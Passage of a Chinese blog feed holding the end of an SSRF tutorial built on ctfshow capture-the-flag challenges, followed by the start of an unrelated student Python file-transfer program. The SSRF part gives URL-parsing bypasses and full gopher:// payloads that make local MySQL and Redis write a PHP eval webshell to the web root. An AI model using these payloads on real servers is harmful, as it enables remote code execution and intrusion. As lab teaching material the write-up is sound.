number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-2-限制为http-www-xxx-com-域名时（利用-）"><a href="#5-2-限制为http-www-xxx-com-域名时（利用-）" class="headerlink" title="5.2 限制为http://www.xxx.com 域名时（利用@）"></a>5.2 限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</h4><p>可以尝试采用http基本身份认证的方式绕过如：<a href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异./">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异。</a><br>在PHP的parse_url中会识别<a href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p><h5 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的正则表示以<code>http://ctf.</code>开头，以<code>show</code>结尾，即匹配<code>http://ctf.*show</code> ，我们可以用@方式进行绕过，如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，如果不在<code>show</code>前面加<code>#</code>或<code>?</code>，会把<strong>show</strong>也解析到<strong>path</strong>中，得不到想要的结果</p><h4 id="5-3-SSRF利用-Gopher-协议拓展攻击面"><a href="#5-3-SSRF利用-Gopher-协议拓展攻击面" class="headerlink" title="5.3 SSRF利用 Gopher 协议拓展攻击面"></a>5.3 SSRF利用 Gopher 协议拓展攻击面</h4><h5 id="Web359"><a href="#Web359" class="headerlink" title="Web359"></a>Web359</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Web359登录界面.png" alt="1666666568052" style="zoom:25%;" /><p>随便输一个用户名，进入后台<del>靶场并没有做</del>，使用hackbar工具打开，我们可以看到在登录时前后端传参的方法</p><pre class="line-numbers language-none"><code class="language-none">returl&#x3D;https%3A%2F%2F404.chall.ctf.show%2F&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SSRF漏洞出现在returl参数上， 利用gopher协议去打无密码的mysql 。</p><p>这里要用到工具Gopherus来生成payload进行rce ，我们可以做一个一句话木马写进去</p><blockquote><p>工具下载地址: <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> </p></blockquote><blockquote><p>select ‘<?php eval($_POST[1]); ?>‘ into outfile ‘/var/www/html/1.php</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面.png" style="zoom: 67%;" /><blockquote><p>这里得到的参数必须在进行一次URL编码才能进行利用。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">returl&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%2520%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2501%2500%2500%2500%2501&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个是check.php 不过没找到什么可以用的东西….</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/file|dict/i"</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">_request</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$url</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">_request</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span><span class="token variable">$https</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token operator">=</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置不需要头信息</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取页面内容，但不输出</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$https</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做服务器认</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做客户端认证</span>        <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token operator">==</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置请求是post方式</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置post请求数据</span>        <span class="token punctuation">&#125;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行访问</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭curl，释放资源</span><span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ctfshow{2abfc1df-79f7-49a9-b02a-d5d5908d150e}</p></blockquote><h5 id="Web360"><a href="#Web360" class="headerlink" title="Web360"></a>Web360</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ssrf打redis，基本上四种攻击方式：</p><ul><li>写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li><li>主从复制</li></ul><p>当然这个题目肯定是shell，这次的flag并不在本地的flag文件中。题目提示我们打redis，同样用Gopherus工具来生成我们的payload。同样写一句话木马进去。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面2.png" style="zoom: 80%;" /><blockquote><p>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</p></blockquote><h4 id="5-4-其他绕过方式："><a href="#5-4-其他绕过方式：" class="headerlink" title="5.4 其他绕过方式："></a>5.4 其他绕过方式：</h4><p><strong>利用特殊域名利用[::]</strong></p><p><strong>可以利用[::]来绕过localhost</strong></p><blockquote><p style="color:orange;">http://169.254.169.254>>http://[::169.254.169.254] </p></blockquote><blockquote><p style="color:orange;">利用句号: 127。0。0。1 >>> 127.0.0.1</p></blockquote><p><strong>CRLF 编码绕过</strong></p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车        %0a-&gt;0x0a-&gt;\n换行        进行HTTP头部注入</p><p style="color:orange;">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </p></blockquote><p><strong>封闭的字母数字</strong></p><h3 id="六、常见限制及对应方式："><a href="#六、常见限制及对应方式：" class="headerlink" title="六、常见限制及对应方式："></a>六、常见限制及对应方式：</h3><p>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p><blockquote><p style="color:orange;">采用http基本身份认证的方式绕过，即@http://www.xxx.com@www.xxc.com</p></blockquote><p>2.限制请求IP不为内网地址</p><blockquote><p style="color:orange;">当不允许ip为内网地址时：采取短网址绕过、采取特殊域名、采取进制转换</p></blockquote><p>3.限制请求只为http协议</p><blockquote><p style="color:orange;">采取302跳转、采取短地址</p></blockquote><h3 id="七、免责声明"><a href="#七、免责声明" class="headerlink" title="七、免责声明"></a>七、免责声明</h3><blockquote><p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络实训之简单文件传输系统器</title>
      <link href="/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/"/>
      <url>/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>只能说计算机网络实训那一周我是真的难受，不仅仅有我自己的实训任务还有别人的，自己这个任务一实际上是第一天就写完了的，大部分的时间是在做网络的一些内容，以及同组其他成员的可视化。</p><hr><p>[TOC]</p><h2 id="简单文件传输系统器"><a href="#简单文件传输系统器" class="headerlink" title="简单文件传输系统器"></a>简单文件传输系统器</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本文件传输系统为一款实现内网文件传输的类FTP协议软件，由Python语言开发。客户端程序与服务器端程序分别运行局域网内不同主机上，实现客户端与服务器端的文件传输功能。</p><h3 id="服务器界面："><a href="#服务器界面：" class="headerlink" title="服务器界面："></a>服务器界面：</h3><center><img src="./简单文件传输器/wps1.jpg"style="zoom:80%;" /><center> <center>图1-1 文件传输系统服务端</center>该界面包括开始等待下载按钮和选择共享文件夹按钮。<p>本程序是一款通过服务器客户端的方式实现一个类FTP协议下载功能的应用软件。</p><center><img src="./简单文件传输器/wps2.jpg" style="zoom:80%;" /> </center><center>图1-2 共享文件夹选择页面</center>点击选择共享文件夹按钮后，路径选择界面，选择文件夹作为共享文件夹，客户端可以自由获取该文件夹下的文件。同时服务器端会读取当前共享文件夹路径下的所有文件名，写入文件菜单.txt中。<p>在选择好共享文件后，点击开始等待下载，程序通过点击，服务器进入被动等待，同时服务器会进行弹窗展示自己的IP地址（内网地址）</p><center><img src="./简单文件传输器/wps3.jpg" style="zoom:80%;" /> </center><center>图1-3 弹窗显示服务器内网IP地址</center>在此之后，服务器端将等待客户端与其建立连接，连接建立后将持续等待客户端发送文件下载请求，但同一时间只能与一个客户端建立连接。<h3 id="客户端界面"><a href="#客户端界面" class="headerlink" title="客户端界面"></a>客户端界面</h3><p>首先运行客户端后，会进入客户端页面，如图2-1所示。 </p><center><img src="./简单文件传输器/wps4.jpg" style="zoom:80%;" /> </center><center>图2-1 客户端页面</center>该界面包括对应的服务器IP地址输入栏，文件输入栏。还有下载按钮和文件存放地址设置按钮。在服务器开启后依次输入输入服务器IP地址，与需要下载的文件，设置文件存放地址，点击下载程序将自动链接服务器，下载需下载的文件。<p>执行程序时，应先下载文件菜单.txt文件，以获悉共享文件夹下的内容。</p><p>当文件完成下载时会进行弹窗提示，用户可继续通过当前客户端下载服务器共享文件夹下的其他文件。</p><center><img src="./简单文件传输器/wps5.jpg" style="zoom:80%;" /> </center><center>图2-2文件下载完成后的相应提示</center>### 开发环境<p>本项目使用Python语言开发，使用 PyCharm编译器进行开发。使用WxPython库进行可视化界面制作，同时以socket,Json，struct等支持库进行服务器与客户端的链接。</p><p>在开发过程中，客户端程序与服务器端程序分开进行开发。</p><h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ol><li><p>在使用时请在服务器地址下放置需要客户端下载的内容</p></li><li><p>由于使用支持库socket的限制，本程序只能实现在同一子网下不同主机间的通信，无法实现对内网的穿透实现外网通信。</p></li><li><p>由于windows计算机防火墙的存在，在设计传输程序的过程中，一直选用8000端口作为通信端口，同时手动开启服务器该端口号，只有服务器固定端口号打开时程序才能顺利运行。</p></li><li><p>客户端输入IP地址应为局域网内的内网地址，即程序运行过程中服务器端提示地址（原因见注意事项1）。</p></li><li><p>在实际应用时，进行了一些简单的过滤，避免客户端通过简单注入即可危害服务器信息安全（读取到不应读取的内容）。</p></li></ol><h3 id="服务器代码："><a href="#服务器代码：" class="headerlink" title="服务器代码："></a>服务器代码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">getIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip<span class="token operator">=</span>s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> ip<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>getIP<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（服务器）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'开始等待下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'简单文件传输器'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>port<span class="token operator">=</span><span class="token number">8000</span>        <span class="token comment"># 设置默认端口号为8848 钛合金手机</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token 